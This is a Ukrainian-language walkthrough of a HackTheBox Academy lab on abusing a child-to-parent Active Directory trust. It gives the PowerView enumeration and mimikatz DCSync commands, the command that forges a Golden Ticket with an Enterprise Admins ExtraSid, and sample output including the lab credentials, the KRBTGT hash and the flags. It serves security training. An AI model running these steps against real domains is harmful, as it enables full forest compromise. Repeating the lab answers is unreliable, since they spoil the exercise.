# Attacking Domain Trusts — Child → Parent (ExtraSids, Windows)

## ℹ️ Інформація

| Поле        | Значення |
| ----------- | -------- |
| 🌐 Platform | HackTheBox Academy |
| 📚 Module   | Active Directory Enumeration & Attacks |
| 🔗 Section  | Attacking Domain Trusts - Child -> Parent Trusts - from Windows |
| 🧩 Lab Host | ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL |

***

## 🔑 Теорія (дуже коротко)

Атака на довіру доменів “child → parent” через ExtraSids дозволяє, маючи повний контроль над дочірнім доменом, **імітувати** обліковий запис, який у root-домені є членом високопривілейованої групи (наприклад, Enterprise Admins).  
Основна ідея: ми крадемо NT-хеш KRBTGT дочірнього домену (через DCSync), створюємо Golden Ticket для вигаданого користувача (`hacker`) у child-домені, і в полі ExtraSids квитка додаємо SID групи Enterprise Admins з root-домену.  
У результаті сервіс у root-домені (ACADEMY-EA-DC01) сприймає нашого “hacker” як Enterprise Admin’а, і ми отримуємо доступ до ресурсів, як-от `\\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt`.

***

## 🧪 Практика — відповіді на питання

### Q1 — What is the SID of the child domain?

**Мета:** дізнатись SID дочірнього домену `LOGISTICS.INLANEFREIGHT.LOCAL`, який потім використаємо в `kerberos::golden` як `/sid`.

1. Підключаємось по RDP до child DC:  
   - Host: `10.129.26.49` (або поточна IP-адреса з Academy)  
   - User: `htb-student_adm`  
   - Password: `HTB_@cademy_stdnt_admin!`  

2. Відкриваємо PowerShell і виконуємо команду PowerView:

```powershell
PS C:\htb> Get-DomainSID
У виводі отримуємо SID домену, наприклад:

text
S-1-5-21-2806153819-209893948-922872689
Це і є SID дочірнього домену LOGISTICS.INLANEFREIGHT.LOCAL.

✅ Відповідь Q1:
S-1-5-21-2806153819-209893948-922872689

Q2 — What is the SID of the Enterprise Admins group in the root domain?
Мета: знайти SID групи Enterprise Admins у root-домені INLANEFREIGHT.LOCAL, щоб додати його в ExtraSids при створенні Golden Ticket.

У тій самій PowerShell-сесії на ACADEMY-EA-DC02 виконуємо:

powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
Приклад виводу:

text
distinguishedname : CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
objectsid         : S-1-5-21-3842939050-3880317879-2865463114-519
Поле objectsid — це SID групи Enterprise Admins у root-домені.

✅ Відповідь Q2:
S-1-5-21-3842939050-3880317879-2865463114-519

Підготовка до Q3 — отримання KRBTGT hash (DCSync)
Мета: витягнути NTLM-хеш KRBTGT акаунта дочірнього домену, щоб використати його в kerberos::golden при побудові Golden Ticket.

На ACADEMY-EA-DC02 переходимо до каталогу з mimikatz:

powershell
PS C:\Windows\system32> cd C:\Tools\mimikatz\x64
PS C:\Tools\mimikatz\x64> .\mimikatz.exe
У mimikatz вмикаємо debug-привілегії:

text
mimikatz # privilege::debug
Privilege '20' OK
Виконуємо DCSync проти KRBTGT дочірнього домену:

text
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
З виводу беремо:

text
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
...
Hash NTLM: 9d765b482771505cbe97411065964d5f
SID домену: S-1-5-21-2806153819-209893948-922872689 (Q1 ми вже це знали, тут ще раз підтвердження).

NT-хеш KRBTGT: 9d765b482771505cbe97411065964d5f.

Q3 — Perform the ExtraSids attack… (flag.txt on ACADEMY-EA-DC01)
Формулювання:
“Perform the ExtraSids attack, abusing a child to parent trust, and authenticate to ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL as an Enterprise Admin equivalent user. Submit the contents of the flag.txt file located in c:\ExtraSids on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.”

Задача: використати ExtraSids у Golden Ticket, щоб отримати доступ до C$ на ACADEMY-EA-DC01 і прочитати c:\ExtraSids\flag.txt.

Крок 1 — перевіряємо поточний доступ до C$ parent DC (очікується відмова)
Щоб показати, що до атаки доступу немає:

powershell
PS C:\Windows\system32> ls \\academy-ea-dc01.inlanefreight.local\c$
# Access is denied (до виконання атаки)
Крок 2 — створюємо Golden Ticket з ExtraSids у mimikatz
Що нам потрібно для команди:

/user:hacker — довільне ім’я користувача (може не існувати як об’єкт в AD).

/domain:LOGISTICS.INLANEFREIGHT.LOCAL — FQDN дочірнього домену.

/sid:S-1-5-21-2806153819-209893948-922872689 — SID child-домену (Q1).

/krbtgt:9d765b482771505cbe97411065964d5f — NTLM-хеш KRBTGT, який ми дістали через DCSync.

/sids:S-1-5-21-3842939050-3880317879-2865463114-519 — SID групи Enterprise Admins у root-домені (Q2).

/ptt — “pass-the-ticket”, одразу завантажити квиток у поточну сесію.

Команда:

text
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
Після успіху mimikatz виводить, що квиток створено і “submitted for current session”.

Крок 3 — перевірка Kerberos-квитка в пам’яті
Виходимо в PowerShell і дивимось кеш квитків:

powershell
PS C:\Windows\system32> klist
Приклад результату:

text
Current LogonId is 0:0xc4860

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/21/2026 5:19:58 (local)
        End Time:   3/18/2036 5:19:58 (local)
        Renew Time: 3/18/2036 5:19:58 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
Це підтверджує, що ми зараз працюємо з квитком для користувача hacker у child-домені, модифікованим через ExtraSids.

Крок 4 — доступ до C$ parent DC і читання flag.txt
Тепер перевіряємо доступ до C$:

powershell
PS C:\Windows\system32> ls \\academy-ea-dc01.inlanefreight.local\c$
Результат вже з доступом:

text
    Directory: \\academy-ea-dc01.inlanefreight.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/31/2022  12:34 PM                Department Shares
d-----         4/7/2022   2:31 PM                ExtraSids
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         4/9/2022   4:59 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----        3/31/2022  11:09 AM                User Shares
d-r---        10/6/2021  10:31 AM                Users
d-----        4/18/2022  11:37 AM                Windows
d-----        3/31/2022  11:12 AM                ZZZ_archive
Тепер читаємо вміст flag.txt:

powershell
PS C:\Windows\system32> type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
f@ll1ng_l1k3_d0m1no3$
✅ Відповідь Q3 (flag):
f@ll1ng_l1k3_d0m1no3$

Короткий підсумок логіки атаки
Є повний контроль над child-доменом LOGISTICS.INLANEFREIGHT.LOCAL (адмінські креденшіали на ACADEMY-EA-DC02).

Через DCSync (lsadump::dcsync) витягуємо NT-хеш KRBTGT child-домену.

Створюємо Golden Ticket для вигаданого користувача hacker у child-домені, але з ExtraSids, де додаємо SID групи Enterprise Admins root-домену.

Завантажуємо квиток у поточну сесію (/ptt), отримуємо Kerberos-квиток hacker @ LOGISTICS.INLANEFREIGHT.LOCAL з правами Enterprise Admin у root-домені.

Використовуємо цей квиток, щоб отримати доступ до \\academy-ea-dc01.inlanefreight.local\c$ і прочитати c:\ExtraSids\flag.txt.
